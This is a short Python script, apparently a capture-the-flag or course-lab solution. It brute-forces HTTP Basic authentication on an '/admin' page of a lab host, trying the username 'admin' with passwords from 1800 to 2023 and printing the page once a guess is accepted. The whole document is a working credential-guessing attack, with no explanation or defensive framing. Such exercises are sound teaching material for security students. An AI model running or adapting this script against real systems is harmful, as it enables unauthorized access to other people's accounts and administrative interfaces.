import requests
import base64

url = "https://99da32e5-0cfe-40dd-b20b-a2cba3d10d54-web.web.lms.itmo.xyz/admin"

print('start')
for i in range(1800, 2024):
    auth_str = f"admin:{i}"
    
    auth_bytes = base64.b64encode(auth_str.encode('utf-8')).decode('utf-8')
    
    headers = {
        "authorization": f"Basic {auth_bytes}"
    }
    
    response = requests.get(url, headers=headers)
    
    if(response.text != 'Unauthorized Access'):

        print(i, response.text)
        break